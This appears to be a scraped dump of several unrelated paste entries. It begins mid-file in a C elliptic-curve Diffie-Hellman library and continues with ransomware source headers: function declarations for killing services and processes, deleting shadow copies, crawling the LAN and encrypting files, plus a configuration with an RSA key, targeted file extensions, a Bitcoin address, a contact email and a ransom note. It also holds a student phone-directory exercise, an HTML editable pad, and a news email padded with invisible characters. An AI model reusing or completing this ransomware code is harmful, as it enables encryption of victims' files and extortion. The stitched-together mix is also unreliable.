          && (*(--x)) == 0)
  {
    i -= 32;
  }
  /* Run through rest if count is not multiple of bitsize of DTYPE */
  if (i != 0)
  {
    uint32_t u32mask = ((uint32_t)1 << 31);
    while (((*x) & u32mask) == 0)
    {
      u32mask >>= 1;
      i -= 1;
    }
  }
  return i;
}

/* left-shift by 'count' digits */
static void bitvec_lshift(bitvec_t x, const bitvec_t y, int nbits)
{
  int nwords = (nbits / 32);

  /* Shift whole words first if nwords > 0 */
  int i,j;
  for (i = 0; i < nwords; ++i)
  {
    /* Zero-initialize from least-significant word until offset reached */
    x[i] = 0;
  }
  j = 0;
  /* Copy to x output */
  while (i < BITVEC_NWORDS)
  {
    x[i] = y[j];
    i += 1;
    j += 1;
  }

  /* Shift the rest if count was not multiple of bitsize of DTYPE */
  nbits &= 31;
  if (nbits != 0)
  {
    /* Left shift rest */
    int i;
    for (i = (BITVEC_NWORDS - 1); i > 0; --i)
    {
      x[i]  = (x[i] << nbits) | (x[i - 1] >> (32 - nbits));
    }
    x[0] <<= nbits;
  }
}


/*************************************************************************************************/
/*
  Code that does arithmetic on bit-vectors in the Galois Field GF(2^CURVE_DEGREE).
*/
/*************************************************************************************************/


static void gf2field_set_one(gf2elem_t x)
{
  /* Set first word to one */
  x[0] = 1;
  /* .. and the rest to zero */
  int i;
  for (i = 1; i < BITVEC_NWORDS; ++i)
  {
    x[i] = 0;
  }
}

#if defined(CONST_TIME) && (CONST_TIME == 0)
/* fastest check if x == 1 */
static int gf2field_is_one(const gf2elem_t x) 
{
  /* Check if first word == 1 */
  if (x[0] != 1)
  {
    return 0;
  }
  /* ...and if rest of words == 0 */
  int i;
  for (i = 1; i < BITVEC_NWORDS; ++i)
  {
    if (x[i] != 0)
    {
      break;
    }
  }
  return (i == BITVEC_NWORDS);
}
#else
/* constant-time check */
static int gf2field_is_one(const gf2elem_t x)
{
  int ret = 0;
  /* Check if first word == 1 */
  if (x[0] == 1)
  {
    ret = 1;
  }
  /* ...and if rest of words == 0 */
  int i;
  for (i = 1; i < BITVEC_NWORDS; ++i)
  {
    ret &= (x[i] == 0);
  }
  return ret; //(i == BITVEC_NWORDS);
}
#endif


/* galois field(2^m) addition is modulo 2, so XOR is used instead - 'z := a + b' */
static void gf2field_add(gf2elem_t z, const gf2elem_t x, const gf2elem_t y)
{
  int i;
  for (i = 0; i < BITVEC_NWORDS; ++i)
  {
    z[i] = (x[i] ^ y[i]);
  }
}

/* increment element */
static void gf2field_inc(gf2elem_t x)
{
  x[0] ^= 1;
}


/* field multiplication 'z := (x * y)' */
static void gf2field_mul(gf2elem_t z, const gf2elem_t x, const gf2elem_t y)
{
  int i;
  gf2elem_t tmp;
#if defined(CONST_TIME) && (CONST_TIME == 1)
  gf2elem_t blind;
  bitvec_set_zero(blind);
#endif
  assert(z != y);

  bitvec_copy(tmp, x);

  /* LSB set? Then start with x */
  if (bitvec_get_bit(y, 0) != 0)
  {
    bitvec_copy(z, x);
  }
  else /* .. or else start with zero */
  {
    bitvec_set_zero(z);
  }

  /* Then add 2^i * x for the rest */
  for (i = 1; i < CURVE_DEGREE; ++i)
  {
    /* lshift 1 - doubling the value of tmp */
    bitvec_lshift(tmp, tmp, 1);

    /* Modulo reduction polynomial if degree(tmp) > CURVE_DEGREE */
    if (bitvec_get_bit(tmp, CURVE_DEGREE))
    {
      gf2field_add(tmp, tmp, polynomial);
    }
#if defined(CONST_TIME) && (CONST_TIME == 1)
    else /* blinding operation */
    {
      gf2field_add(tmp, tmp, blind);
    }
#endif

    /* Add 2^i * tmp if this factor in y is non-zero */
    if (bitvec_get_bit(y, i))
    {
      gf2field_add(z, z, tmp);
    }
#if defined(CONST_TIME) && (CONST_TIME == 1)
    else /* blinding operation */
    {
      gf2field_add(z, z, blind);
    }
#endif
  }
}

/* field inversion 'z := 1/x' */
static void gf2field_inv(gf2elem_t z, const gf2elem_t x)
{
  gf2elem_t u, v, g, h;
  int i;

  bitvec_copy(u, x);
  bitvec_copy(v, polynomial);
  bitvec_set_zero(g);
  gf2field_set_one(z);
  
  while (!gf2field_is_one(u))
  {
    i = (bitvec_degree(u) - bitvec_degree(v));

    if (i < 0)
    {
      bitvec_swap(u, v);
      bitvec_swap(g, z);
      i = -i;
    }
#if defined(CONST_TIME) && (CONST_TIME == 1)
    else
    {
      bitvec_swap(u, v);
      bitvec_swap(v, u);
    }
#endif
    bitvec_lshift(h, v, i);
    gf2field_add(u, u, h);
    bitvec_lshift(h, g, i);
    gf2field_add(z, z, h);
  }
}

/*************************************************************************************************/
/*
   The following code takes care of Galois-Field arithmetic. 
   Elliptic curve points are represented  by pairs (x,y) of bitvec_t. 
   It is assumed that curve coefficient 'a' is {0,1}
   This is the case for all NIST binary curves.
   Coefficient 'b' is given in 'coeff_b'.
   '(base_x, base_y)' is a point that generates a large prime order group.
*/
/*************************************************************************************************/


static void gf2point_copy(gf2elem_t x1, gf2elem_t y1, const gf2elem_t x2, const gf2elem_t y2)
{
  bitvec_copy(x1, x2);
  bitvec_copy(y1, y2);
}

static void gf2point_set_zero(gf2elem_t x, gf2elem_t y)
{
  bitvec_set_zero(x);
  bitvec_set_zero(y);
}

static int gf2point_is_zero(const gf2elem_t x, const gf2elem_t y)
{
  return (    bitvec_is_zero(x)
           && bitvec_is_zero(y));
}

/* double the point (x,y) */
static void gf2point_double(gf2elem_t x, gf2elem_t y)
{
  /* iff P = O (zero or infinity): 2 * P = P */
  if (bitvec_is_zero(x))
  {
    bitvec_set_zero(y);
  }
  else
  {
    gf2elem_t l;

    gf2field_inv(l, x);
    gf2field_mul(l, l, y);
    gf2field_add(l, l, x);
    gf2field_mul(y, x, x);
    gf2field_mul(x, l, l);
#if (coeff_a == 1)
    gf2field_inc(l);
#endif
    gf2field_add(x, x, l);
    gf2field_mul(l, l, x);
    gf2field_add(y, y, l);
  }
}


/* add two points together (x1, y1) := (x1, y1) + (x2, y2) */
static void gf2point_add(gf2elem_t x1, gf2elem_t y1, const gf2elem_t x2, const gf2elem_t y2)
{
  if (!gf2point_is_zero(x2, y2))
  {
    if (gf2point_is_zero(x1, y1))
    {
      gf2point_copy(x1, y1, x2, y2);
    }
    else
    {
      if (bitvec_equal(x1, x2))
      {
        if (bitvec_equal(y1, y2))
        {
          gf2point_double(x1, y1);
        }
        else
        {
          gf2point_set_zero(x1, y1);
        }
      }
      else
      {
        /* Arithmetic with temporary variables */
        gf2elem_t a, b, c, d;

        gf2field_add(a, y1, y2);
        gf2field_add(b, x1, x2);
        gf2field_inv(c, b);
        gf2field_mul(c, c, a);
        gf2field_mul(d, c, c);
        gf2field_add(d, d, c);
        gf2field_add(d, d, b);
#if (coeff_a == 1)
        gf2field_inc(d);
#endif
        gf2field_add(x1, x1, d);
        gf2field_mul(a, x1, c);
        gf2field_add(a, a, d);
        gf2field_add(y1, y1, a);
        bitvec_copy(x1, d);
      }
    }
  }
}



#if defined(CONST_TIME) && (CONST_TIME == 0)
/* point multiplication via double-and-add algorithm */
static void gf2point_mul(gf2elem_t x, gf2elem_t y, const scalar_t exp)
{
  gf2elem_t tmpx, tmpy;
  int i;
  int nbits = bitvec_degree(exp);

  gf2point_set_zero(tmpx, tmpy);

  for (i = (nbits - 1); i >= 0; --i)
  {
    gf2point_double(tmpx, tmpy);
    if (bitvec_get_bit(exp, i))
    {
      gf2point_add(tmpx, tmpy, x, y);
    }
  }
  gf2point_copy(x, y, tmpx, tmpy);
}
#else
/* point multiplication via double-and-add-always algorithm using scalar blinding */
static void gf2point_mul(gf2elem_t x, gf2elem_t y, const scalar_t exp)
{
  gf2elem_t tmpx, tmpy;
  gf2elem_t dummyx, dummyy;
  int i;
  int nbits = bitvec_degree(exp);

  gf2point_set_zero(tmpx, tmpy);
  gf2point_set_zero(dummyx, dummyy);

  for (i = (nbits - 1); i >= 0; --i)
  {
    gf2point_double(tmpx, tmpy);

    /* Add point if bit(i) is set in exp */
    if (bitvec_get_bit(exp, i))
    {
      gf2point_add(tmpx, tmpy, x, y);
    }
    /* .. or add the neutral element to keep operation constant-time */
    else
    {
      gf2point_add(tmpx, tmpy, dummyx, dummyy);
    }
  }
  gf2point_copy(x, y, tmpx, tmpy);
}
#endif



/* check if y^2 + x*y = x^3 + a*x^2 + coeff_b holds */
static int gf2point_on_curve(const gf2elem_t x, const gf2elem_t y)
{
  gf2elem_t a, b;

  if (gf2point_is_zero(x, y))
  {
    return 1;
  }
  else
  {
    gf2field_mul(a, x, x);
#if (coeff_a == 0)
    gf2field_mul(a, a, x);
#else
    gf2field_mul(b, a, x);
    gf2field_add(a, a, b);
#endif
    gf2field_add(a, a, coeff_b);
    gf2field_mul(b, y, y);
    gf2field_add(a, a, b);
    gf2field_mul(b, x, y);

    return bitvec_equal(a, b);
  }
}


/*************************************************************************************************/
/*
  Elliptic Curve Diffie-Hellman key exchange protocol.
*/
/*************************************************************************************************/



/* NOTE: private should contain random data a-priori! */
int ecdh_generate_keys(uint8_t* public_key, uint8_t* private_key)
{
  /* Get copy of ""base"" point 'G' */
  gf2point_copy((uint32_t*)public_key, (uint32_t*)(public_key + BITVEC_NBYTES), base_x, base_y);

  /* Abort key generation if random number is too small */
  if (bitvec_degree((uint32_t*)private_key) < (CURVE_DEGREE / 2))
  {
    return 0;
  }
  else
  {
    /* Clear bits > CURVE_DEGREE in highest word to satisfy constraint 1 <= exp < n. */
    int nbits = bitvec_degree(base_order);
    int i;

    for (i = (nbits - 1); i < (BITVEC_NWORDS * 32); ++i)
    {
      bitvec_clr_bit((uint32_t*)private_key, i);
    }

    /* Multiply base-point with scalar (private-key) */
    gf2point_mul((uint32_t*)public_key, (uint32_t*)(public_key + BITVEC_NBYTES), (uint32_t*)private_key);

    return 1;
  }
}



int ecdh_shared_secret(const uint8_t* private_key, const uint8_t* others_pub, uint8_t* output)
{
  /* Do some basic validation of other party's public key */
  if (    !gf2point_is_zero ((uint32_t*)others_pub, (uint32_t*)(others_pub + BITVEC_NBYTES))
       &&  gf2point_on_curve((uint32_t*)others_pub, (uint32_t*)(others_pub + BITVEC_NBYTES)) )
  {
    /* Copy other side's public key to output */
    unsigned int i;
    for (i = 0; i < (BITVEC_NBYTES * 2); ++i)
    {
      output[i] = others_pub[i];
    }

    /* Multiply other side's public key with own private key */
    gf2point_mul((uint32_t*)output,(uint32_t*)(output + BITVEC_NBYTES), (const uint32_t*)private_key);

    /* Multiply outcome by cofactor if using ECC CDH-variant: */
#if defined(ECDH_COFACTOR_VARIANT) && (ECDH_COFACTOR_VARIANT == 1)
 #if   (cofactor == 2)
    gf2point_double((uint32_t*)output, (uint32_t*)(output + BITVEC_NBYTES));
 #elif (cofactor == 4)
    gf2point_double((uint32_t*)output, (uint32_t*)(output + BITVEC_NBYTES));
    gf2point_double((uint32_t*)output, (uint32_t*)(output + BITVEC_NBYTES));
 #endif
#endif
    
    return 1;
  }
  else
  {
    return 0;
  }
}"
SHTh545z,main.h,FlyFar,C++,Sunday 24th of March 2024 12:16:57 AM CDT,"#ifndef __LOCKER_MAIN__
#define __LOCKER_MAIN__

#include ""libs/TinyECDH/ecdh.h""
#include ""libs/ChaCha20/chacha20.h""
#include ""libs/SHA256/sha256.h""

#define DEBUG
#ifdef DEBUG
	#include <stdio.h>
#endif

#define ARRAY_SIZE(x) (sizeof(x) / sizeof(x)[0])

//-- Core functions
BOOLEAN ChaChaKey1Setup();
VOID ECDHPrivateKeySetup(BYTE *input, int incount);
VOID MountVolumes();
VOID ServiceFucker();
VOID ProcessFucker();
VOID ShadowFucker();
VOID SearchLAN(LPNETRESOURCEW resourcename);
DWORD WINAPI SearchFilesThreaded(LPVOID lpParam);
VOID SearchFiles(WCHAR *pathname, int layer);
VOID CryptFile(const WCHAR *filename);

//-- Util functions
BOOL myIsWow64Process();
PCHAR *CommandLineToArgvA(PCHAR CmdLine, int *_argc);
LPVOID myHeapAlloc(int len);
VOID   myHeapFree(LPVOID mem);

//-- Unmanaged imports
typedef BOOL WINAPI(*pdef_IsWow64Process)(HANDLE hProcess, PBOOL bResult);
typedef BOOL WINAPI(*pdef_Wow64DisableWow64FsRedirection)(PVOID *OldValue);
typedef BOOL WINAPI(*pdef_Wow64RevertWow64FsRedirection)(PVOID OldValue);
typedef BOOLEAN WINAPI(*pdef_RtlGenRandom)(PVOID RandomBuffer,ULONG RandomBufferLength);

//-- Global variables
BYTE CHACHA20KEY_1[88];
BYTE CHACHA20KEY_2[44];

BYTE CHACHA20_FINAL_KEY_1[32];
BYTE CHACHA20_FINAL_KEY_2[32];

BYTE CHACHA20NONCE_1[12];
BYTE CHACHA20NONCE_2[12];

BYTE CHACHA20_FINAL_NONCE[12];

BYTE VICTIM_ECDH_PUBLIC_KEY[ECC_PUB_KEY_SIZE];
BYTE VICTIM_ECDH_PRIVATE_KEY[ECC_PRV_KEY_SIZE];

BYTE ECDH_SHARED_SECRET[ECC_PUB_KEY_SIZE];

CRITICAL_SECTION critSection;

#endif"
T88bhjKT,week3,excellent940707,C++,Sunday 24th of March 2024 12:16:26 AM CDT,"#include <iostream>
using namespace std;

// Assuming a maximum of 10 entries in the directory
const int DIRECTORY_SIZE = 10;
// Array of pointers to names (C-style strings)
const char *names[DIRECTORY_SIZE] = {""Amy"", ""Brian"", ""Cindy"", ""David"", ""Eric""};
// Array of pointers to phone numbers (C-style strings)
const char *phoneNumbers[DIRECTORY_SIZE] = {""0987654321"", ""0912345678"", ""0911111111"", ""0922222222"",""0933333333""};
// Function prototypes
void printDirectory();
void findPhoneNumber(const char *name);
void updatePhoneNumber(const char *name, const char *newNumber);

int main() {
 // Program entry point
 int act;
 char text[20], text2[11];
 while(cin>>act){
  if(act==1){
    printDirectory();
  }else if(act==2){
    cin.ignore();
    cin.getline(text, 20);
    findPhoneNumber(text);
  }else{
    cin.ignore();
    cin.getline(text, 20);
    cin.getline(text2, 11);
    cout<<text2<<'\n';
    updatePhoneNumber(text, text2);
  }
 }
 return 0;
}

// Implement the functions here
void printDirectory(){
  for(int i=0;i<DIRECTORY_SIZE;++i)
    if(names[i])cout<<""name: ""<<names[i]<<' '<<""phone number: ""<<phoneNumbers[i]<<'\n';
}

void findPhoneNumber(const char*name){
  for(int i=0;i<DIRECTORY_SIZE;++i){
    if(names[i]){
      bool flag=1;
      for(int j=0;names[i][j]!='\0';++j){
        if(name[j]=='\0'){
          flag=0;
          break;
        }else if(names[i][j]!=name[j]){
          flag=0;
          break;
        }
      }
      if(flag){
        cout<<""name: ""<<names[i]<<' '<<""phone number: ""<<phoneNumbers[i]<<'\n';
        return;
      }
    }
  }
  cout<<""Not find\n"";
}

void updatePhoneNumber(const char *name, const char *newNumber){
  for(int i=0;i<DIRECTORY_SIZE;++i){
    if(names[i]){
      bool flag=1;
      for(int j=0;names[i][j]!='\0';++j){
        if(name[j]=='\0'){
          flag=0;
          break;
        }else if(names[i][j]!=name[j]){
          flag=0;
          break;
        }
      }
      if(flag){
        phoneNumbers[i]=newNumber;
        cout<<""Update successful!\n"";
        return;
      }
    }
  }
  cout<<""Update falid!\n"";
}"
90LV104D,config.h,FlyFar,C++,Sunday 24th of March 2024 12:06:20 AM CDT,"#ifndef __CONFIG_H__
#define __CONFIG_H__

#define MASTER_RSA_PUB L""MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwL"" \
                       ""hQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15w"" \
                       ""VLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68E"" \
                       ""ZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB""

#define FILE_EXT_WHITE L"".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb"" \
                       L"".gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln""  \
                       L"".sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip.""
                       
#define FOLDER_BLCKLST L""C:\\Windows;""

//
#define RANSOM_NOTE_EML1 L""wowsmith123456@posteo.net""

#define BITCOIN_ADDRESS1 L""1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX""

#define RANSOM_NOTE_NAME L""README.TXT""

#define RANSOM_NOTE_TXT1 L""Ooops, your important files are encrypted.\r\n"" \
						 L""\r\n"" \
						 L""If you see this text, then your files are no longer accessible, because\r\n"" \
						 L""they have been encrypted. Perhaps you are busy looking for a way to recover\r\n"" \
						 L""your files, but don't waste your time. Nobody can recover your files without\r\n"" \
						 L""our decryption service.\r\n"" \
						 L""\r\n"" \
						 L""We guarantee that you can recover all your files safely and easily.\r\n"" \
						 L""All you need to do is submit the payment and purchase the decryption key.\r\n"" \
						 L""\r\n"" \
						 L""Please follow the instructions:\r\n"" \
						 L""\r\n"" \
						 L""1.\tSend $300 worth of Bitcoin to following address:\r\n"" \
						 L""\r\n""
						 
#define RANSOM_NOTE_TXT2 L""2.\tSend your Bitcoin wallet ID and personal installation key to e-mail ""

#define RANSOM_NOTE_TXT3 L""\tYour personal installation key:\r\n\r\n""

#define MAX_BLOCK_NCRYPT 0x100000

#define TIME_WAIT_DEFAULT 1;

#endif"
p7VB7LGU,main.h,FlyFar,C++,Sunday 24th of March 2024 12:05:17 AM CDT,"#ifndef __MAIN_H__
#define __MAIN_H__

#include ""config.h""

typedef struct
{
	WCHAR *RootPathName;
	CONST WCHAR *hRSAKeyStr;
	BOOL   bUnknown;
	HCRYPTPROV hProv;
	HCRYPTKEY  hAESKey;
	HCRYPTKEY  hRSAKey;
	HANDLE hDriveHandle;
} RANSOM_STRUCT;

DWORD WINAPI enum_drive(LPVOID lpParam);
BOOL gen_aes_key(RANSOM_STRUCT *crypto_struct);
VOID enum_files(WCHAR *zePath, int recursion_count, RANSOM_STRUCT *crypto_struct);
VOID encrypt_file(WCHAR *zeFile, RANSOM_STRUCT *crypto_struct);
VOID write_note(RANSOM_STRUCT *crypto_struct);
BOOL import_rsa_key(RANSOM_STRUCT *crypto_struct);
WCHAR *export_aes_key(RANSOM_STRUCT *crypto_struct);
DWORD GetRandomNumber();

#endif"
LmwV3TJj,content_editable_browser_pad,Python253,HTML,Saturday 23rd of March 2024 11:59:20 PM CDT,"<!--
HTML Document: Content Editable Browser Pad

This HTML document creates a simple browser pad with a contenteditable div element. 
Users can type, edit, and modify the content within the div directly in their web browser. 
The pad has a minimum height of 400 pixels and is bordered with a 2-pixel solid line in light gray color for visual distinction. 
Additionally, the padding inside the div is set to 10 pixels.

Attributes:
- lang: Specifies the language of the document (English).
- charset: Defines the character encoding for the document (UTF-8).
- viewport: Sets the initial scale and width of the viewport for responsive design.
- title: Specifies the title of the document displayed in the browser tab.

Tags Used:
- html: The root element of an HTML document.
- head: Contains meta-information about the HTML document.
- meta: Provides metadata about the HTML document, such as character encoding and viewport settings.
- title: Defines the title of the HTML document.
- body: Represents the content of the HTML document.
- div: A block-level element used to create a container with editable content.
- contenteditable: Specifies whether the content of the div element is editable by the user.

Styling:
- min-height: Sets the minimum height of the contenteditable div to 400 pixels.
- border: Applies a 2-pixel solid border around the contenteditable div, colored in light gray (#ccc).
- padding: Adds 10 pixels of padding inside the contenteditable div for better spacing.

Usage:
- Users can open this HTML document in any web browser and start typing or editing content directly within the contenteditable div. 
The browser pad can be useful for taking notes, drafting text, or any other purpose where quick and simple text editing is required.

Note:
- Users can directly embed JavaScript code in the address bar of their web browser to execute scripts on the current web page. However, caution should be exercised when executing arbitrary JavaScript code obtained from untrusted sources, as it may pose security risks.

How To Embed:
- Input the following command into an empty address bar: 
  data:text/html,<html contenteditable><body>Type Anything Here. You Can Even Imbed Your Own JavaScript...</body></html>

-->

<!DOCTYPE html>
<html lang=""en"">
<head>
  <meta charset=""UTF-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
  <title>Content Editable Browser Pad</title>
</head>
<body>
  <div contenteditable=""true"" style=""min-height: 400px; border: 2px solid #ccc; padding: 10px;"">
  </div>
</body>
</html>
"
Wyu7M4FD,News March23 24,Newscaster_Ned,Email,Saturday 23rd of March 2024 11:55:56 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎,‎ ‎t‎h‎e‎n‎ ‎h‎i‎t‎ ‎t‎h‎e‎ ‎s‎n‎o‎o‎z‎e‎.‎

K‎a‎m‎a‎l‎a‎ ‎C‎o‎m‎e‎s‎ ‎f‎o‎r‎ ‎A‎m‎e‎r‎i‎c‎a‎’‎s‎ ‎G‎u‎n‎s‎

B‎i‎d‎e‎n‎ ‎D‎i‎s‎p‎a‎t‎c‎h‎e‎s‎ ‎V‎E‎E‎P‎ ‎t‎o‎ ‎F‎u‎n‎d‎ ‎R‎e‎d‎ ‎F‎l‎a‎g‎ ‎L‎a‎w‎s‎
U‎.‎S‎.‎ ‎V‎i‎c‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎m‎a‎k‎e‎s‎ ‎s‎t‎a‎t‎e‎m‎e‎n‎t‎s‎ ‎d‎u‎r‎i‎n‎g‎ ‎a‎ ‎p‎r‎e‎s‎s‎ ‎c‎o‎n‎f‎e‎r‎e‎n‎c‎e‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎R‎o‎m‎a‎
O‎n‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎,‎ ‎V‎i‎c‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎s‎p‎o‎k‎e‎ ‎f‎r‎o‎m‎ ‎M‎a‎r‎j‎o‎r‎y‎ ‎S‎t‎o‎n‎e‎m‎a‎n‎ ‎D‎o‎u‎g‎l‎a‎s‎ ‎h‎i‎g‎h‎ ‎s‎c‎h‎o‎o‎l‎ ‎a‎n‎d‎ ‎a‎n‎n‎o‎u‎n‎c‎e‎d‎ ‎t‎h‎r‎e‎e‎ ‎q‎u‎a‎r‎t‎e‎r‎s‎ ‎o‎f‎ ‎a‎ ‎b‎i‎l‎l‎i‎o‎n‎ ‎d‎o‎l‎l‎a‎r‎s‎ ‎b‎e‎i‎n‎g‎ ‎d‎e‎d‎i‎c‎a‎t‎e‎d‎ ‎t‎o‎ ‎s‎e‎c‎u‎r‎i‎n‎g‎ ‎m‎o‎r‎e‎ ‎r‎e‎d‎ ‎f‎l‎a‎g‎ ‎l‎a‎w‎s‎.‎ ‎


W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎:‎ ‎B‎i‎d‎e‎n‎ ‎H‎a‎s‎ ‎S‎t‎r‎o‎n‎g‎ ‎R‎e‎c‎o‎v‎e‎r‎y‎,‎ ‎B‎u‎t‎ ‎P‎e‎o‎p‎l‎e‎ ‎‘‎B‎u‎s‎y‎’‎ ‎a‎n‎d‎ ‎W‎a‎t‎c‎h‎ ‎‘‎T‎h‎e‎ ‎B‎a‎c‎h‎e‎l‎o‎r‎
W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎:‎ ‎B‎i‎d‎e‎n‎ ‎H‎a‎s‎ ‎G‎o‎o‎d‎ ‎R‎e‎c‎o‎v‎e‎r‎y‎,‎ ‎P‎e‎o‎p‎l‎e‎ ‎D‎o‎n‎'‎t‎ ‎F‎o‎l‎l‎o‎w‎ ‎N‎e‎w‎s‎ ‎C‎o‎n‎s‎t‎a‎n‎t‎l‎y‎
1‎,‎5‎5‎3‎
W‎y‎o‎m‎i‎n‎g‎ ‎B‎a‎n‎s‎ ‎‘‎G‎e‎n‎d‎e‎r‎-‎R‎e‎a‎s‎s‎i‎g‎n‎m‎e‎n‎t‎,‎’‎ ‎P‎u‎b‎e‎r‎t‎y‎ ‎B‎l‎o‎c‎k‎i‎n‎g‎ ‎P‎r‎o‎c‎e‎d‎u‎r‎e‎s‎ ‎f‎o‎r‎ ‎C‎h‎i‎l‎d‎r‎e‎n‎
W‎y‎o‎m‎i‎n‎g‎ ‎B‎a‎n‎s‎ ‎'‎G‎e‎n‎d‎e‎r‎-‎R‎e‎a‎s‎s‎i‎g‎n‎m‎e‎n‎t‎'‎ ‎P‎r‎o‎c‎e‎d‎u‎r‎e‎s‎ ‎f‎o‎r‎ ‎C‎h‎i‎l‎d‎r‎e‎n‎
1‎8‎4‎
P‎o‎l‎i‎c‎e‎:‎ ‎S‎q‎u‎a‎t‎t‎e‎r‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎N‎Y‎C‎ ‎W‎o‎m‎a‎n‎’‎s‎ ‎B‎o‎d‎y‎ ‎F‎o‎u‎n‎d‎ ‎S‎t‎u‎f‎f‎e‎d‎ ‎i‎n‎ ‎D‎u‎f‎f‎e‎l‎ ‎B‎a‎g‎
P‎o‎l‎i‎c‎e‎:‎ ‎S‎q‎u‎a‎t‎t‎e‎r‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎N‎Y‎C‎ ‎W‎o‎m‎a‎n‎'‎s‎ ‎B‎o‎d‎y‎ ‎F‎o‎u‎n‎d‎ ‎i‎n‎ ‎D‎u‎f‎f‎e‎l‎ ‎B‎a‎g‎
2‎6‎4‎
K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎T‎h‎r‎e‎e‎ ‎Q‎u‎a‎r‎t‎e‎r‎s‎ ‎o‎f‎ ‎a‎ ‎B‎i‎l‎l‎i‎o‎n‎ ‎D‎o‎l‎l‎a‎r‎s‎ ‎f‎o‎r‎ ‎M‎o‎r‎e‎ ‎R‎e‎d‎ ‎F‎l‎a‎g‎ ‎L‎a‎w‎s‎
V‎P‎ ‎K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎$‎7‎5‎0‎ ‎M‎i‎l‎l‎i‎o‎n‎ ‎f‎o‎r‎ ‎M‎o‎r‎e‎ ‎R‎e‎d‎ ‎F‎l‎a‎g‎ ‎L‎a‎w‎s‎
7‎8‎1‎
R‎u‎s‎s‎i‎a‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎1‎1‎ ‎A‎r‎r‎e‎s‎t‎s‎ ‎A‎f‎t‎e‎r‎ ‎M‎o‎s‎c‎o‎w‎ ‎C‎o‎n‎c‎e‎r‎t‎ ‎H‎a‎l‎l‎ ‎T‎e‎r‎r‎o‎r‎ ‎A‎t‎t‎a‎c‎k‎ ‎T‎h‎a‎t‎ ‎L‎e‎f‎t‎ ‎A‎t‎ ‎L‎e‎a‎s‎t‎ ‎1‎1‎5‎ ‎D‎e‎a‎d‎
R‎u‎s‎s‎i‎a‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎1‎1‎ ‎A‎r‎r‎e‎s‎t‎s‎ ‎A‎f‎t‎e‎r‎ ‎M‎o‎s‎c‎o‎w‎ ‎C‎o‎n‎c‎e‎r‎t‎ ‎H‎a‎l‎l‎ ‎T‎e‎r‎r‎o‎r‎ ‎A‎t‎t‎a‎c‎k‎
4‎,‎0‎4‎0‎
‘‎B‎l‎u‎e‎-‎E‎y‎e‎d‎ ‎W‎h‎i‎t‎e‎ ‎D‎e‎v‎i‎l‎s‎’‎:‎ ‎F‎l‎o‎r‎i‎d‎a‎ ‎M‎a‎n‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎R‎a‎c‎i‎s‎t‎ ‎R‎a‎n‎t‎ ‎o‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎A‎i‎r‎l‎i‎n‎e‎s‎ ‎F‎
